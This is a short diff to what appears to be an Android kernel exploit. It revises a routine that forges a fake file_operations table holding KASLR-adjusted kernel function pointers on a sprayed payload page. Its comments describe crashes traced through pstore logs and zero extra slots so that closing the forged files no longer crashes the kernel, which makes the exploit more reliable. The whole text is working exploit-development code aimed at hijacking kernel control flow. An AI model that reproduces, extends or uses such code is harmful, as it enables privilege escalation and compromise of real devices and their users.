@@ -1541,9 +1541,29 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
     put64(p, off + FOPS_OPEN_OFF,
           open_zero ? 0 : (uint64_t)text_addr(ASHMEM_OPEN));
   }
-  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
+  /* release=0 (was ASHMEM_RELEASE): with the fd's f_op anchored at table+1,
+   * __fput reads release from table[0x81..0x88] -- but filp_close's flush
+   * read spans table[0x79..0x80], whose last byte table[0x80] is this
+   * slot's first byte.  A true (KASLR-dependent, usually non-zero) byte at
+   * table[0x80] re-arms flush for every fake-fops file.  __fput skips a
+   * NULL release, so zero is the only safe value here. */
+  put64(p, off + FOPS_RELEASE_OFF, 0);
   put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
   put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
+  /* Close-path residue kill (fix67): flush/fasync were NEVER written here,
+   * so their bytes were whatever pipe/skb prepare left on the payload page
+   * -- an unmodelled variable.  fix66's page held 0x1000000000000012 at
+   * flush's misaligned read [0x79..0x80] and pipe_prepare's clone child
+   * exited straight into it (pstore: pc=0x12, SP/PC alignment, lr=
+   * filp_close+0x54); the three exam2 success runs only survived because
+   * their residue happened to be 0 (cbz skip).  Zero 0x78..0x97 so flush
+   * [0x79..0x80], release [0x81..0x88], fasync [0x89..0x90] all read NULL
+   * and every close of a fake-fops file is safe regardless of page
+   * residue.  refresh_fake_fops_text re-zeros the same span through the
+   * +1 anchor (the offset the kernel actually dereferences). */
+  put64(p, off + FOPS_FLUSH_OFF, 0);
+  put64(p, off + 0x88, 0);
+  put64(p, off + 0x90, 0);
 }
 
 /*
